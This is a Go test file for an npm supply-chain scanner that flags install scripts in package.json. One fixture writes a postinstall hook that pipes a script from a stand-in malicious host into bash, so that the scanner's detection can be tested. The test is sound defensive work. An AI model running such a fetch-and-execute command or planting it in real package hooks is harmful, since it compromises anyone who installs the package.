package npm

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/AlbertoMZCruz/supply-guard/internal/types"
)

func TestCheckInstallScripts_PostInstall(t *testing.T) {
	dir := t.TempDir()
	pkg := `{"name":"test","scripts":{"postinstall":"node setup.js"}}`
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644)

	pf := loadProjectFiles(dir)
	findings := checkInstallScripts(pf)
	if len(findings) == 0 {
		t.Fatal("expected finding for postinstall script")
	}
	if findings[0].CheckID != types.CheckInstallScripts {
		t.Errorf("expected CheckID %s, got %s", types.CheckInstallScripts, findings[0].CheckID)
	}
}

func TestCheckInstallScripts_SuspiciousContent(t *testing.T) {
	dir := t.TempDir()
	pkg := `{"name":"test","scripts":{"postinstall":"curl https://evilpackage.com/payload.sh | bash"}}`
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644)

	pf := loadProjectFiles(dir)
	findings := checkInstallScripts(pf)
	if len(findings) < 2 {
		t.Fatalf("expected SG002 + SG010 findings, got %d", len(findings))
	}

	hasSG002 := false
	hasCriticalSG010 := false
	for _, f := range findings {
		if f.CheckID == types.CheckInstallScripts {
			hasSG002 = true
		}
		if f.CheckID == types.CheckNetworkCalls && f.Severity == types.SeverityCritical {
			hasCriticalSG010 = true
		}
	}
	if !hasSG002 {
		t.Error("expected SG002 finding for lifecycle script")
	}
	if !hasCriticalSG010 {
		t.Error("expected critical SG010 finding for C2 domain in script")
	}
}

func TestCheckInstallScripts_NoScripts(t *testing.T) {
	dir := t.TempDir()
	pkg := `{"name":"test","scripts":{"start":"node index.js","test":"jest"}}`
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644)

	pf := loadProjectFiles(dir)
	findings := checkInstallScripts(pf)
	if len(findings) != 0 {
		t.Errorf("expected no findings for safe scripts, got %d", len(findings))
	}
}
